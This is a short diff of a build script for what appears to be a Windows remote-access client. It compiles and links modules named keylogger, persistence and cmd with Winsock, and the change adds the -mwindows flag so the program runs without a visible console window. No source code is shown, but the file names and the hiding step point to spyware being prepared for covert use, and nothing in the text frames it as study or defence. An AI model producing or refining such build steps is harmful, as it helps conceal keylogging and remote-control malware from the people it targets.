@@ -7,6 +7,6 @@ g++ -c cmd.cpp
 g++ -c persistence.cpp
 
 echo Linking...
-g++ -o client.exe client.o cmd.o keylogger.o persistence.o -lws2_32
+g++ -o client.exe client.o cmd.o keylogger.o persistence.o -lws2_32 -mwindows
 
 echo Done.
